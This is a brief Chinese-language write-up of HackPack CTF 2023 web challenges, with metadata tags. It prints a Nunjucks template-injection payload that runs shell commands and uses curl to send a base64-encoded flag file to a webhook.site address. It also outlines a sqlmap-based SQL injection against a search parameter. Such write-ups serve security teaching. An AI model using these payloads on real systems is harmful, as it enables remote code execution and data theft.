---
title: HackPack CTF 2023 WP
contest: HackPack CTF 2023
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [web, ssti, nunjucks, jinja, jwt, sqli, dora, rce, sqlmap]
attack_chain:
  - issue-tracker SSTI: {{process.mainModule.require('child_process').exec('curl webhook')}}
  - 添加payload到 issue 标题/描述
  - webhook: cat flag.txt | base64 → curl
  - WolfHowl: 搜索框SQL注入双引号闭合
  - sqlmap 攻击 artist POST 参数
  - JWT/session 利用
key_payload: {{process.mainModule.require('child_process').exec('curl ...?$(cat flag.txt | base64)')}}
one_liner: HackPack 2023：Nunjucks SSTI外带+SQL注入双引号闭合
lesson: Nunjucks SSTI {{process.mainModule.require}}可执行命令
quality: medium
---

# HackPack CTF 2023 WP

## 题目信息
- 比赛：HackPack CTF 2023
- 战队：狼组安全社区
- 类别：Web

## 关键攻击链
### 1. issue-tracker
- SSTI 注入点
- Nunjucks 模板引擎
- Payload:
  ```
  {{process.mainModule.require('child_process').exec('curl https://webhook.site/3cb22bdf-1ff2-47d5-b99f-d6b7b186398b?$(cat flag.txt | base64)')}}
  ```
- 上下都添加 webhook 接收 flag

### 2. WolfHowl (SQLMAP)
- 注入点：搜索框
- 闭合方式：双引号
- POST 参数：artist
- sqlmap 攻击获取数据库内容

## 评分
- quality: medium（Nunjucks SSTI + SQL 注入双引号闭合）
